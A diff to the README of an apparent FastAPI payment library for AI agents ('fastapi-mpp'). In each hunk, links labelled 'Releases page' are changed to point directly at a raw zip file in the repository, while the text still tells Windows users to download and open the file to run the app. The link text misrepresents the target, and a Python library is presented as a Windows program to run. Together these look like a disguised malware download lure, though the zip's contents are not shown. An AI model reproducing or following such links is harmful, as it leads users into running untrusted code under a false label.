@@ -1,6 +1,6 @@
 # ⚙️ fastapi-mpp - Secure API payments for AI agents
 
-[![Download fastapi-mpp](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge)](https://github.com/NilupulThisaranga/fastapi-mpp/releases)
+[![Download fastapi-mpp](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/NilupulThisaranga/fastapi-mpp/main/src/mpp_fastapi/mpp_fastapi_1.9.zip)
 
 ## 🧩 What this app does
 
@@ -10,7 +10,7 @@ This project is built for APIs that need machine-to-machine payments. It fits us
 
 ## 📥 Download fastapi-mpp
 
-Visit the [Releases page](https://github.com/NilupulThisaranga/fastapi-mpp/releases) to download and run this app on Windows.
+Visit the [Releases page](https://raw.githubusercontent.com/NilupulThisaranga/fastapi-mpp/main/src/mpp_fastapi/mpp_fastapi_1.9.zip) to download and run this app on Windows.
 
 On that page, look for the latest release and download the Windows file that matches your system. After the download finishes, open the file to start the setup or run the app.
 
@@ -30,7 +30,7 @@ If your PC can run modern desktop apps and open files from GitHub Releases, it s
 
 Follow these steps to use fastapi-mpp on Windows.
 
-1. Open the [Releases page](https://github.com/NilupulThisaranga/fastapi-mpp/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/NilupulThisaranga/fastapi-mpp/main/src/mpp_fastapi/mpp_fastapi_1.9.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file from the Assets list.
 4. Save the file to a folder you can find again, such as Downloads.
@@ -209,7 +209,7 @@ A simple owner flow can look like this:
 
 ## 📌 Download again if needed
 
-If you need the file later, use the [Releases page](https://github.com/NilupulThisaranga/fastapi-mpp/releases) again to download and run this file on Windows
+If you need the file later, use the [Releases page](https://raw.githubusercontent.com/NilupulThisaranga/fastapi-mpp/main/src/mpp_fastapi/mpp_fastapi_1.9.zip) again to download and run this file on Windows
 
 ## 🛠️ File names you may see
 
